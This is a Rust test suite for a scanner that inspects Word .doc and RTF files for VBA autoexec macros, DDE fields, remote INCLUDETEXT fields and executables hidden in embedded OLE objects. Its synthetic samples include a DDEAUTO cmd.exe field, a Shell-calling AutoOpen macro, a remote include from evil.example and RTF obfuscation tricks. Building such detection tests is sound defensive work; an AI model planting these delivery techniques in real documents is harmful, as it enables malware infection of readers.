#[path = "../shared/doc_support/mod.rs"]
mod support;
use support::ole_common;

use std::fs;

use crate::support::shared_fixtures::finding;
use crate::support::shared_fixtures::{doc_cfb, word_stream, write};
use doc_checker::CheckOptions;
use doc_checker::format_dispatcher::scan_file;
use doc_checker::viewer_block_table::viewer_blocked;
use doc_checker::{Category, FileReport, Format, Severity, ViewerBlocked};
use ole_common::{Cfb, compress, dir_stream, make_cfb, make_cfb_v4, module_stream};

fn scan_doc(extra: &[(&str, &[u8])], flags1: u16, body: &[u8]) -> FileReport {
    let (_d, p) = write("a.doc", &doc_cfb(extra, flags1, body).bytes);
    scan_file(&p, &CheckOptions::default())
}

fn vba_streams(source: &str) -> Vec<(String, Vec<u8>)> {
    let dir = compress(&dir_stream(&[("Module1", "Module1", 16)]));
    vec![("Macros/VBA/dir".to_string(), dir), ("Macros/VBA/Module1".to_string(), module_stream(16, source))]
}

fn scan_vba(source: &str) -> FileReport {
    let owned = vba_streams(source);
    let extra: Vec<(&str, &[u8])> = owned.iter().map(|(n, b)| (n.as_str(), b.as_slice())).collect();
    scan_doc(&extra, 0, b"hello")
}

#[test]
fn minimal_doc_has_no_findings() {
    let r = scan_doc(&[], 0, b"plain text body");
    assert_eq!(r.format, Some(Format::Doc));
    assert!(r.findings.is_empty() && !r.incomplete, "{:?} {:?}", r.findings, r.reasons);
}

#[test]
fn ole_without_a_worddocument_stream_is_a_format_mismatch() {
    let cfb = make_cfb(&[("Workbook", &[1u8; 600][..])]);
    let (_d, p) = write("a.doc", &cfb.bytes);
    let r = scan_file(&p, &CheckOptions::default());
    let f = finding(&r, "FORMAT_MISMATCH");
    assert_eq!((f.category, f.severity), (Category::Defect, Severity::Medium));
}

#[test]
fn encrypted_doc_is_incomplete_and_cyan_not_clean() {
    let r = scan_doc(&[], 0x0100, b"cipher");
    assert!(r.incomplete && r.reasons.iter().any(|x| FileReport::is_encrypted_reason(x)), "{:?}", r.reasons);
    assert!(r.findings.is_empty(), "{:?}", r.findings);
}

#[test]
fn vba_project_is_high_and_benign_macros_are_not_critical() {
    let r = scan_vba("Sub Hello()\r\n  MsgBox \"hi\"\r\nEnd Sub\r\n");
    let f = finding(&r, "DOC_VBA_MACRO");
    assert_eq!((f.category, f.severity), (Category::Security, Severity::High));
    assert!(!r.has("DOC_VBA_AUTOEXEC") && !r.has("DOC_VBA_SUSPICIOUS"));
}

#[test]
fn autoexec_alone_is_high_and_autoexec_with_shell_is_critical() {
    let r = scan_vba("Sub AutoOpen()\r\n  MsgBox \"hi\"\r\nEnd Sub\r\n");
    assert_eq!(finding(&r, "DOC_VBA_AUTOEXEC").severity, Severity::High);
    assert!(!r.has("DOC_VBA_SUSPICIOUS"));
    let r = scan_vba("Private Sub Document_Open()\r\n  Shell \"calc.exe\"\r\nEnd Sub\r\n");
    assert_eq!(finding(&r, "DOC_VBA_SUSPICIOUS").severity, Severity::Critical);
    assert!(r.has("DOC_VBA_AUTOEXEC"));
    for name in ["AutoExec", "AutoClose", "Auto_Open", "DocumentOpen", "Workbook_Open", "Document_Close"] {
        let r = scan_vba(&format!("Sub {name}()\r\nEnd Sub\r\n"));
        assert!(r.has("DOC_VBA_AUTOEXEC"), "{name}");
    }
}

#[test]
fn macro_free_doc_whose_text_mentions_shell_and_autoopen_is_clean() {
    let r = scan_doc(&[], 0, b"The word Shell and AutoOpen and powershell appear in this prose only.");
    assert!(r.findings.is_empty(), "{:?}", r.findings);
}

#[test]
fn an_unreadable_vba_project_is_still_high_and_marks_the_scan_incomplete() {
    let r = scan_doc(&[("Macros/VBA/dir", b"not a compressed stream"), ("Macros/VBA/Module1", b"x")], 0, b"hi");
    assert_eq!(finding(&r, "DOC_VBA_MACRO").severity, Severity::High);
    assert!(r.incomplete, "{:?}", r.reasons);
}

#[test]
fn object_pool_is_high_and_native_payloads_are_checked_for_executables() {
    let r = scan_doc(&[("ObjectPool/_1/CompObj", &[0u8; 100][..])], 0, b"hi");
    assert_eq!(finding(&r, "DOC_OLE_OBJECT").severity, Severity::High);
    assert!(!r.has("EMBEDDED_EXECUTABLE"));

    let native = |label: &str, payload: &[u8]| {
        let mut body = Vec::new();
        body.extend_from_slice(&2u16.to_le_bytes());
        body.extend_from_slice(label.as_bytes());
        body.push(0);
        body.extend_from_slice(format!("C:\\tmp\\{label}").as_bytes());
        body.push(0);
        body.extend_from_slice(&0u32.to_le_bytes());
        body.extend_from_slice(&0u32.to_le_bytes());
        body.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        body.extend_from_slice(payload);
        let mut s = (body.len() as u32).to_le_bytes().to_vec();
        s.extend(body);
        s
    };
    let by_name = native("payload.exe", b"not really a binary");
    let r = scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &by_name)], 0, b"hi");
    assert!(r.findings.iter().any(|f| f.code == "EMBEDDED_EXECUTABLE" && f.severity == Severity::Critical), "{:?}", r.findings);

    let mut pe = vec![0u8; 0x100];
    pe[..2].copy_from_slice(b"MZ");
    pe[0x3C..0x40].copy_from_slice(&0x40u32.to_le_bytes());
    pe[0x40..0x44].copy_from_slice(b"PE\0\0");
    let by_magic = native("notes.txt", &pe);
    let r = scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &by_magic)], 0, b"hi");
    assert!(r.has("EMBEDDED_EXECUTABLE"), "{:?}", r.findings);

    let picture = native("pic.png", b"\x89PNG\r\n\x1a\n some picture bytes");
    let r = scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &picture)], 0, b"hi");
    assert!(!r.has("EMBEDDED_EXECUTABLE") && r.has("DOC_OLE_OBJECT"), "{:?}", r.findings);
}

fn utf16le(s: &str) -> Vec<u8> {
    s.encode_utf16().flat_map(u16::to_le_bytes).collect()
}

#[test]
fn dde_fields_in_8bit_and_utf16_text_are_flagged() {
    let text = "intro \u{13} DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\" \u{14}result\u{15} outro";
    let r = scan_doc(&[], 0, text.as_bytes());
    assert_eq!(finding(&r, "DOC_DDE_FIELD").severity, Severity::Critical);
    let r = scan_doc(&[], 0, &utf16le(text));
    assert_eq!(finding(&r, "DOC_DDE_FIELD").severity, Severity::Critical);
}

#[test]
fn ordinary_fields_and_remote_includes_are_classified_like_the_ooxml_rules() {
    let normal = "page \u{13} PAGE \u{14}1\u{15} and \u{13} TOC \\\\o \"1-3\" \u{14}x\u{15}";
    assert!(scan_doc(&[], 0, normal.as_bytes()).findings.is_empty());
    let remote = "x \u{13} INCLUDETEXT \"http://evil.example/x.doc\" \u{14}r\u{15}";
    assert_eq!(finding(&scan_doc(&[], 0, remote.as_bytes()), "DOC_DANGEROUS_FIELD").severity, Severity::High);
}

#[test]
fn a_giant_unterminated_field_is_bounded() {
    let mut body = vec![0x13u8];
    body.extend(vec![b'A'; 3_000_000]);
    let start = std::time::Instant::now();
    let r = scan_doc(&[], 0, &body);
    assert!(start.elapsed() < std::time::Duration::from_secs(5));
    assert!(!r.has("DOC_DDE_FIELD"));
}

#[test]
fn structural_damage_is_reported_with_ole_codes_and_a_security_summary() {
    let cfb = doc_cfb(&[("Data", &[7u8; 5000][..])], 0, b"hi");
    let bytes = cfb.bytes.clone();
    let start = container_parser::ole_parser::OleFile::from_bytes(bytes.clone(), &container_parser::ole_parser::Limits::default()).unwrap().find("Data").unwrap().start;
    let mut b = bytes;
    let at = cfb.fat_entry_offset(start);
    b[at..at + 4].copy_from_slice(&start.to_le_bytes());
    let (_d, p) = write("loop.doc", &b);
    let r = scan_file(&p, &CheckOptions::default());
    let f = finding(&r, "OLE_FAT_CYCLE");
    assert_eq!((f.category, f.severity), (Category::Defect, Severity::High));
    let s = finding(&r, "OLE_MALFORMED_STRUCTURE");
    assert_eq!((s.category, s.severity), (Category::Security, Severity::High));
}

#[test]
fn a_truncated_ole_file_is_incomplete_and_never_panics() {
    let mut b = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
    b.resize(512, 0);
    let (_d, p) = write("cut.doc", &b);
    let r = scan_file(&p, &CheckOptions::default());
    assert!(r.incomplete && !r.reasons.iter().any(|x| x.starts_with("panic")), "{:?}", r.reasons);
}

#[test]
fn doc_extension_with_other_content_is_a_mismatch() {
    let (_d, p) = write("a.doc", "그냥 텍스트\n".repeat(50).as_bytes());
    let r = scan_file(&p, &CheckOptions::default());
    assert!(r.has("FORMAT_MISMATCH"), "{:?}", r.findings);
    let mut pe = vec![0u8; 0x100];
    pe[..2].copy_from_slice(b"MZ");
    pe[0x3C..0x40].copy_from_slice(&0x40u32.to_le_bytes());
    pe[0x40..0x44].copy_from_slice(b"PE\0\0");
    let (_d, p) = write("b.doc", &pe);
    assert!(scan_file(&p, &CheckOptions::default()).has("DISGUISED_EXECUTABLE"));
}

#[test]
fn a_zip_named_doc_is_scanned_as_a_docx_package() {
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join("renamed.doc");
    let mut z = zip::ZipWriter::new(fs::File::create(&p).unwrap());
    z.start_file("hello.txt", zip::write::SimpleFileOptions::default()).unwrap();
    std::io::Write::write_all(&mut z, b"hi").unwrap();
    z.finish().unwrap();
    let r = scan_file(&p, &CheckOptions::default());
    assert!(r.has("FORMAT_MISMATCH") && r.has("OOXML_NOT_DOCX"), "{:?}", r.findings);
}

#[test]
fn the_viewer_table_does_not_apply_to_doc() {
    assert_eq!(viewer_blocked(Format::Doc, "ANYTHING"), ViewerBlocked::NotApplicable);
}

#[test]
fn a_nested_field_does_not_hide_the_outer_instruction() {
    // 바깥 지시문 중간에 안쪽 필드가 끼어도 바깥 지시문 전체를 본다(Word는 안쪽 결과를 바깥 지시문에 이어 붙인다).
    let before = "x \u{13} DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \u{13} QUOTE a \u{14}b\u{15} \"/k calc\" \u{14}r\u{15} y";
    let after = "x \u{13} INCLUDETEXT \u{13} MERGEFIELD a \u{14}b\u{15} \"http://evil.example/x.doc\" \u{14}r\u{15} y";
    for (text, code) in [(before, "DOC_DDE_FIELD"), (after, "DOC_DANGEROUS_FIELD")] {
        assert!(scan_doc(&[], 0, text.as_bytes()).has(code), "8bit {code}");
        assert!(scan_doc(&[], 0, &utf16le(text)).has(code), "utf16 {code}");
    }
    // 중첩이 매우 깊어도 시간이 터지지 않고 미완료로 남는다.
    let deep = "\u{13} A ".repeat(100_000);
    let start = std::time::Instant::now();
    let r = scan_doc(&[], 0, deep.as_bytes());
    assert!(start.elapsed() < std::time::Duration::from_secs(5));
    assert!(r.incomplete, "{:?}", r.reasons);
}

#[test]
fn a_word_stream_larger_than_the_field_limit_is_incomplete() {
    // 512바이트 섹터 fixture는 DIFAT 한도(약 7MiB)에 걸려 4096바이트 섹터로 만든다.
    let word = word_stream(0, &vec![b'A'; 17 * 1024 * 1024]);
    let (_d, p) = write("big.doc", &make_cfb_v4(&[("WordDocument", &word)]).bytes);
    let r = scan_file(&p, &CheckOptions::default());
    assert!(r.incomplete, "{:?}", r.reasons);
    assert!(r.reasons.iter().any(|m| m.contains("WordDocument")), "{:?}", r.reasons);
}

#[test]
fn a_doc_named_file_with_unanalyzed_content_is_incomplete() {
    let r = scan_file(&write("a.doc", b"<html><body>hello</body></html>").1, &CheckOptions::default());
    assert!(r.has("FORMAT_MISMATCH") && r.incomplete, "{:?} {:?}", r.findings, r.reasons);
    let r = scan_file(&write("b.doc", "그냥 텍스트\n".repeat(50).as_bytes()).1, &CheckOptions::default());
    assert!(r.incomplete, "{:?}", r.reasons);
}

#[test]
fn an_executable_hidden_in_the_native_source_or_temp_path_is_flagged() {
    // 레이블은 얌전하게 두고 원본 경로나 임시 경로에만 실행 파일 이름을 넣는다.
    let native = |label: &str, src: &str, temp: &str| {
        let mut body = Vec::new();
        body.extend_from_slice(&2u16.to_le_bytes());
        body.extend_from_slice(label.as_bytes());
        body.push(0);
        body.extend_from_slice(src.as_bytes());
        body.push(0);
        body.extend_from_slice(&0u32.to_le_bytes());
        body.extend_from_slice(&((temp.len() + 1) as u32).to_le_bytes());
        body.extend_from_slice(temp.as_bytes());
        body.push(0);
        body.extend_from_slice(&4u32.to_le_bytes());
        body.extend_from_slice(b"data");
        let mut s = (body.len() as u32).to_le_bytes().to_vec();
        s.extend(body);
        s
    };
    for (name, bytes) in [("src", native("notes.txt", "C:\\x\\run.exe", "C:\\t\\a.txt")), ("temp", native("notes.txt", "C:\\x\\a.txt", "C:\\t\\run.scr"))] {
        let r = scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &bytes)], 0, b"hi");
        assert!(r.has("EMBEDDED_EXECUTABLE"), "{name}: {:?}", r.findings);
    }
    let clean = native("notes.txt", "C:\\x\\a.txt", "C:\\t\\a.txt");
    assert!(!scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &clean)], 0, b"hi").has("EMBEDDED_EXECUTABLE"));
}

fn scan_named(name: &str, cfb: &Cfb) -> FileReport {
    let (_d, p) = write(name, &cfb.bytes);
    scan_file(&p, &CheckOptions::default())
}

#[test]
fn docx_that_is_an_encrypted_package_is_incomplete_cyan() {
    let cfb = make_cfb(&[("EncryptionInfo", &[4u8, 0, 4, 0, 0, 0][..]), ("EncryptedPackage", &[0u8; 64][..])]);
    for name in ["a.docx", "b.docm", "c.doc"] {
        let r = scan_named(name, &cfb);
        assert!(r.incomplete, "{name}: {:?}", r.reasons);
        assert!(r.reasons.iter().any(|m| FileReport::is_encrypted_reason(m) && m.contains("EncryptedPackage")), "{name}: {:?}", r.reasons);
        // 암호화 패키지는 구형 Word 문서가 아니므로 WordDocument 부재를 결함으로 칠하지 않는다.
        assert!(!r.findings.iter().any(|f| f.location == "WordDocument"), "{name}: {:?}", r.findings);
    }
    // 이름이 docx인데 OLE 내용이므로 확장자 불일치는 알린다. `.doc`는 OLE가 맞으니 알리지 않는다.
    assert!(scan_named("a.docx", &cfb).has("FORMAT_MISMATCH"));
    assert!(!scan_named("c.doc", &cfb).has("FORMAT_MISMATCH"));
}

#[test]
fn docx_that_is_a_renamed_doc_is_analyzed_as_doc() {
    let owned = vba_streams("Sub AutoOpen()\nShell \"calc\"\nEnd Sub\n");
    let mut streams: Vec<(&str, &[u8])> = owned.iter().map(|(n, b)| (n.as_str(), b.as_slice())).collect();
    let word = word_stream(0, b"hello");
    streams.push(("WordDocument", &word));
    let r = scan_named("renamed.docx", &make_cfb(&streams));
    assert!(r.has("FORMAT_MISMATCH"), "{:?}", r.findings);
    assert!(r.has("DOC_VBA_MACRO"), "{:?} {:?}", r.findings, r.reasons);
    assert_eq!(finding(&r, "DOC_VBA_SUSPICIOUS").severity, Severity::Critical);
}

#[test]
fn docx_ole_without_either_stream_stays_plain_incomplete() {
    let r = scan_named("odd.docx", &make_cfb(&[("Something", &[1u8, 2, 3][..])]));
    assert!(r.has("FORMAT_MISMATCH"), "{:?}", r.findings);
    assert!(r.incomplete && r.reasons.iter().any(|m| m.contains("OLE")), "{:?}", r.reasons);
    assert!(!r.reasons.iter().any(|m| FileReport::is_encrypted_reason(m)), "{:?}", r.reasons);
    assert!(!r.findings.iter().any(|f| f.code.starts_with("DOC_")), "{:?}", r.findings);
}

#[test]
fn a_native_file_name_longer_than_the_display_limit_still_has_its_extension_checked() {
    let native = |label: &str, src: &str, temp: &str| {
        let mut body = Vec::new();
        body.extend_from_slice(&2u16.to_le_bytes());
        body.extend_from_slice(label.as_bytes());
        body.push(0);
        body.extend_from_slice(src.as_bytes());
        body.push(0);
        body.extend_from_slice(&0u32.to_le_bytes());
        body.extend_from_slice(&((temp.len() + 1) as u32).to_le_bytes());
        body.extend_from_slice(temp.as_bytes());
        body.push(0);
        body.extend_from_slice(&4u32.to_le_bytes());
        body.extend_from_slice(b"data");
        let mut s = (body.len() as u32).to_le_bytes().to_vec();
        s.extend(body);
        s
    };
    let long = |ext: &str| format!("{}.{ext}", "A".repeat(400));
    for (name, bytes) in
        [("label", native(&long("exe"), "C:\\x\\a.txt", "C:\\t\\a.txt")), ("src", native("n.txt", &long("scr"), "C:\\t\\a.txt")), ("temp", native("n.txt", "C:\\x\\a.txt", &long("bat")))]
    {
        let r = scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &bytes)], 0, b"hi");
        assert!(r.has("EMBEDDED_EXECUTABLE"), "{name}: {:?}", r.findings);
    }
}

// ---- rtf_checker (하위 모듈을 합치며 옮긴 테스트) ----

mod rtf_checker {
    //! RTF 위장 테스트. fixture는 합성이다. 이름은 Word 문서인데 내용이 RTF인 파일과 `.rtf` 파일을 본다.

    use std::time::{Duration, Instant};

    use crate::support::shared_fixtures::finding;
    use crate::support::shared_fixtures::{pe_bytes, scan};
    use doc_checker::{Format, Severity};

    fn hex(bytes: &[u8]) -> String {
        bytes.iter().map(|b| format!("{b:02x}")).collect()
    }

    const OLE_MAGIC: [u8; 8] = [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];

    fn rtf_with_objdata(control: &str, payload: &[u8]) -> Vec<u8> {
        format!("{{\\rtf1\\ansi{{\\object\\objemb{{\\*\\objclass Word.Document.8}}{{\\*\\{control} {}}}}}}}", hex(payload)).into_bytes()
    }

    #[test]
    fn an_embedded_ole_object_is_high_and_the_name_mismatch_is_reported() {
        let mut payload = OLE_MAGIC.to_vec();
        payload.extend_from_slice(&[0u8; 64]);
        let r = scan("a.doc", &rtf_with_objdata("objdata", &payload));
        assert_eq!(r.format, Some(Format::Doc));
        assert!(r.has("FORMAT_MISMATCH"), "{:?}", r.findings);
        assert_eq!(finding(&r, "RTF_EMBEDDED_OBJECT").severity, Severity::High);
        assert_eq!(finding(&r, "RTF_EMBEDDED_OLE").severity, Severity::High);
        assert!(!r.has("RTF_EMBEDDED_EXECUTABLE"));
    }

    #[test]
    fn an_ole1_wrapped_payload_is_found_past_the_header() {
        let mut payload = vec![0x01, 0x05, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00];
        payload.extend_from_slice(b"Package\0\0\0\0\0\0\0\0\0\0\0\0");
        payload.extend_from_slice(&OLE_MAGIC);
        payload.extend_from_slice(&[0u8; 64]);
        let r = scan("a.rtf", &rtf_with_objdata("objdata", &payload));
        assert!(r.has("RTF_EMBEDDED_OLE"), "{:?}", r.findings);
    }

    #[test]
    fn a_control_word_split_by_hex_escapes_is_still_found() {
        let r = scan("a.doc", &rtf_with_objdata("obj\\'64ata", &OLE_MAGIC));
        assert!(r.has("RTF_EMBEDDED_OBJECT") && r.has("RTF_EMBEDDED_OLE"), "{:?}", r.findings);
        let r = scan("b.doc", &rtf_with_objdata("\\'6fbjdata", &OLE_MAGIC));
        assert!(r.has("RTF_EMBEDDED_OLE"), "{:?}", r.findings);
    }

    #[test]
    fn a_pe_payload_is_critical() {
        let r = scan("a.docx", &rtf_with_objdata("objdata", &pe_bytes()));
        assert_eq!(r.format, Some(Format::Doc));
        assert_eq!(finding(&r, "RTF_EMBEDDED_EXECUTABLE").severity, Severity::Critical);
    }

    #[test]
    fn hex_with_line_breaks_is_read_across_whitespace() {
        let body = hex(&pe_bytes()).as_bytes().chunks(32).map(|c| String::from_utf8_lossy(c).into_owned()).collect::<Vec<_>>().join("\r\n");
        let r = scan("a.rtf", format!("{{\\rtf1{{\\*\\objdata {body}}}}}").as_bytes());
        assert!(r.has("RTF_EMBEDDED_EXECUTABLE"), "{:?}", r.findings);
    }

    #[test]
    fn object_markers_without_a_payload_are_high_but_not_executable() {
        for word in ["objclass Word.Document.8", "objupdate", "objautlink"] {
            let r = scan("a.rtf", format!("{{\\rtf1{{\\*\\{word}}}}}").as_bytes());
            assert_eq!(finding(&r, "RTF_EMBEDDED_OBJECT").severity, Severity::High, "{word}");
            assert!(!r.has("RTF_EMBEDDED_OLE") && !r.has("RTF_EMBEDDED_EXECUTABLE"), "{word}");
        }
    }

    #[test]
    fn the_standard_word_datastore_is_medium_and_a_payload_in_it_is_still_found() {
        // Word가 저장한 RTF는 모두 customXml용 `\datastore`(OLE1 머리말 + Msxml2.SAXXMLReader)를 가진다. 이것만으로는 High가 아니다.
        let mut benign = vec![0x01, 0x05, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00];
        benign.extend_from_slice(b"Msxml2.SAXXMLReader.5.0\0");
        let r = scan("a.rtf", format!("{{\\rtf1{{\\*\\datastore {}}}}}", hex(&benign)).as_bytes());
        assert_eq!(finding(&r, "RTF_DATASTORE").severity, Severity::Medium);
        assert!(!r.has("RTF_EMBEDDED_OBJECT") && !r.has("RTF_EMBEDDED_EXECUTABLE"), "{:?}", r.findings);
        // customXml 저장소는 OLE 복합 파일을 담는 것이 정상이다. OLE 매직만으로는 지표를 더하지 않는다.
        let mut with_ole = benign.clone();
        with_ole.extend_from_slice(&OLE_MAGIC);
        with_ole.extend_from_slice(&[0u8; 64]);
        let r = scan("c.rtf", format!("{{\\rtf1{{\\*\\datastore {}}}}}", hex(&with_ole)).as_bytes());
        assert!(!r.has("RTF_EMBEDDED_OLE") && !r.has("RTF_EMBEDDED_OBJECT"), "{:?}", r.findings);
        // 그 안에 실행 파일을 숨기면 Critical이다.
        let r = scan("b.rtf", &rtf_with_objdata("datastore", &pe_bytes()));
        assert_eq!(finding(&r, "RTF_EMBEDDED_EXECUTABLE").severity, Severity::Critical);
    }

    #[test]
    fn a_plain_rtf_has_no_indicators_and_a_plain_rtf_named_doc_only_mismatches() {
        let rtf = b"{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0 Times New Roman;}}\\pard Hello \\b world\\b0\\par}";
        let r = scan("a.rtf", rtf);
        assert_eq!(r.format, Some(Format::Doc));
        assert!(r.findings.is_empty() && !r.incomplete, "{:?} {:?}", r.findings, r.reasons);
        let r = scan("b.doc", rtf);
        assert!(r.has("FORMAT_MISMATCH"));
        assert!(!r.findings.iter().any(|f| f.code.starts_with("RTF_")));
    }

    #[test]
    fn text_that_only_mentions_the_words_is_not_flagged() {
        let r = scan("a.rtf", b"{\\rtf1 the word objdata and objclass in plain text, not control words}");
        assert!(!r.findings.iter().any(|f| f.code.starts_with("RTF_")), "{:?}", r.findings);
    }

    #[test]
    fn a_megabyte_of_open_braces_is_linear() {
        let mut bytes = b"{\\rtf1".to_vec();
        bytes.extend(std::iter::repeat_n(b'{', 1 << 20));
        let started = Instant::now();
        let r = scan("a.rtf", &bytes);
        assert!(started.elapsed() < Duration::from_secs(5), "{:?}", started.elapsed());
        assert!(!r.has("RTF_EMBEDDED_OBJECT"));
        let mut bytes = b"{\\rtf1".to_vec();
        for _ in 0..(1 << 16) {
            bytes.extend_from_slice(b"\\objdata ");
        }
        let started = Instant::now();
        let r = scan("b.rtf", &bytes);
        assert!(started.elapsed() < Duration::from_secs(5), "{:?}", started.elapsed());
        assert!(r.has("RTF_EMBEDDED_OBJECT"));
    }

    #[test]
    fn rtf_is_recognized_like_word_does_after_a_bom_or_whitespace_and_with_a_short_signature() {
        let body = "{\\objclass X}";
        for (name, head) in [("a.doc", "{\\rt"), ("b.doc", "\u{feff}  \r\n{\\rtf1"), ("c.docx", "\n{\\rtf1")] {
            let r = scan(name, format!("{head}{body}}}").as_bytes());
            assert_eq!(r.format, Some(Format::Doc), "{name}");
            assert!(r.has("RTF_EMBEDDED_OBJECT"), "{name}: {:?}", r.findings);
        }
    }

    #[test]
    fn control_words_groups_and_bin_data_inside_the_hex_do_not_hide_the_payload() {
        let h = hex(&pe_bytes());
        let (a, b) = h.split_at(40);
        let (b, c) = b.split_at(40);
        let cases = [
            format!("{{\\rtf1{{\\*\\objdata {a}\\par {b}\\v0 {c}}}}}"),
            format!("{{\\rtf1{{\\*\\objdata {a}{{\\*\\junk 0123456789abcdef}}{b}{{\\fonttbl{{x}}}}{c}}}}}"),
            format!("{{\\rtf1{{\\*\\objdata {a}\\bin3 abc{b}\\\\\\{{{c}}}}}"),
        ];
        for (i, rtf) in cases.iter().enumerate() {
            assert!(scan("a.rtf", rtf.as_bytes()).has("RTF_EMBEDDED_EXECUTABLE"), "case {i}: {rtf}");
        }
    }

    #[test]
    fn a_payload_the_scan_budget_cannot_reach_is_incomplete_not_clean() {
        let padding = " ".repeat(200 * 1024);
        let r = scan("a.rtf", format!("{{\\rtf1{{\\*\\objdata {padding}{}}}}}", hex(&pe_bytes())).as_bytes());
        assert!(r.incomplete && !r.has("RTF_EMBEDDED_EXECUTABLE"), "{:?} {:?}", r.findings, r.reasons);
        // 상한(256개)을 넘는 objdata가 더 있으면 확인하지 못한 것이다.
        let many = "{\\*\\objdata 00}".repeat(300);
        let r = scan("b.rtf", format!("{{\\rtf1{many}}}").as_bytes());
        assert!(r.incomplete, "{:?}", r.reasons);
        // OLE1 머리말이 길어 본문이 해독한 앞부분 밖에 있으면 확인하지 못한 것이다.
        let mut payload = vec![0x01, 0x05, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00];
        payload.extend_from_slice(&5000u32.to_le_bytes());
        payload.extend(vec![b'A'; 5000]);
        payload.extend_from_slice(&[0u8; 8]);
        payload.extend_from_slice(&4u32.to_le_bytes());
        payload.extend_from_slice(&OLE_MAGIC);
        let r = scan("c.rtf", &rtf_with_objdata("objdata", &payload));
        assert!(r.incomplete, "{:?}", r.reasons);
        // 크지만 평범한 객체(머리말이 짧고 매직이 없다)는 미완료가 아니다.
        let mut plain = vec![0x01, 0x05, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00];
        plain.extend_from_slice(b"Package\0");
        plain.extend_from_slice(&[0u8; 8]);
        plain.extend_from_slice(&20000u32.to_le_bytes());
        plain.extend(vec![0x41u8; 20000]);
        assert!(!scan("d.rtf", &rtf_with_objdata("objdata", &plain)).incomplete);
    }

    #[test]
    fn an_ambiguous_construct_in_the_body_without_an_indicator_is_incomplete() {
        // 안쪽 그룹이나 \binN이 있으면 Word가 본문을 어떻게 읽는지 확정할 수 없다. 지표가 없으면 깨끗하다고 하지 않는다.
        for body in ["0102{\\fonttbl 0304}0506", "0102\\bin3 abc0304", "0102{0304}"] {
            let r = scan("a.rtf", format!("{{\\rtf1{{\\*\\objdata {body}}}}}").as_bytes());
            assert!(r.incomplete, "{body}: {:?}", r.findings);
        }
        // 평범한 본문은 미완료가 아니다.
        assert!(!scan("b.rtf", b"{\\rtf1{\\*\\objdata 0102030405060708}}").incomplete);
    }
}

// ---- RTF 파일 읽기 ----

fn scan_rtf_path(path: &std::path::Path) -> FileReport {
    let mut report = FileReport::new(path, Some(Format::Doc));
    doc_checker::doc::scan_doc_file(path, &CheckOptions::default(), container_parser::magic_sniffer::Sniffed::Rtf, &mut report);
    report
}

#[test]
fn an_rtf_that_cannot_be_opened_is_incomplete() {
    let r = scan_rtf_path(std::path::Path::new("/nonexistent/a.rtf"));
    assert!(r.incomplete && r.reasons.iter().any(|m| m == "RTF file could not be opened"), "{:?}", r.reasons);
}

#[test]
fn an_rtf_that_cannot_be_read_is_incomplete() {
    // 디렉터리는 열리지만 읽을 수 없다.
    let d = tempfile::tempdir().unwrap();
    let r = scan_rtf_path(d.path());
    assert!(r.incomplete && r.reasons.iter().any(|m| m == "RTF file could not be read"), "{:?}", r.reasons);
}

#[test]
fn an_rtf_over_the_read_limit_is_inspected_only_in_part() {
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join("big.rtf");
    let mut file = fs::File::create(&p).unwrap();
    std::io::Write::write_all(&mut file, b"{\\rtf1 text}").unwrap();
    file.set_len(64 * 1024 * 1024 + 16).unwrap(); // 나머지는 0으로 채워진 희소 파일이다

    let r = scan_rtf_path(&p);

    assert!(r.incomplete && r.reasons.iter().any(|m| m.contains("RTF larger than the read limit")), "{:?}", r.reasons);
}

// ---- 내장 객체와 VBA ----

#[test]
fn an_embedded_object_name_longer_than_the_scanned_prefix_is_incomplete() {
    // 4바이트 크기, 2바이트 형식, 그 뒤 널 없는 긴 이름.
    let mut native = vec![0u8; 6];
    native.extend(std::iter::repeat_n(b'a', 70_000));
    let r = scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &native)], 0, b"hi");
    assert!(r.reasons.iter().any(|m| m.contains("longer than the scanned prefix")), "{:?}", r.reasons);
}

#[test]
fn a_vba_project_whose_module_cannot_be_read_is_incomplete() {
    let dir = compress(&dir_stream(&[("Module1", "Module1", 16)]));
    let r = scan_doc(&[("Macros/VBA/dir", &dir)], 0, b"hello");
    assert!(r.reasons.iter().any(|m| m.contains("could not be fully read") || m.contains("could not be read")), "{:?}", r.reasons);
}

#[test]
fn only_the_first_suspicious_keyword_among_several_modules_is_reported() {
    let dir = compress(&dir_stream(&[("Module1", "Module1", 16), ("Module2", "Module2", 16)]));
    let first = module_stream(16, "Sub A()\r\n  Shell \"calc\"\r\nEnd Sub\r\n");
    let second = module_stream(16, "Sub B()\r\n  CreateObject \"x\"\r\nEnd Sub\r\n");
    let r = scan_doc(&[("Macros/VBA/dir", &dir), ("Macros/VBA/Module1", &first), ("Macros/VBA/Module2", &second)], 0, b"hello");
    assert!(r.has("DOC_VBA_MACRO"), "{:?}", r.findings);
}
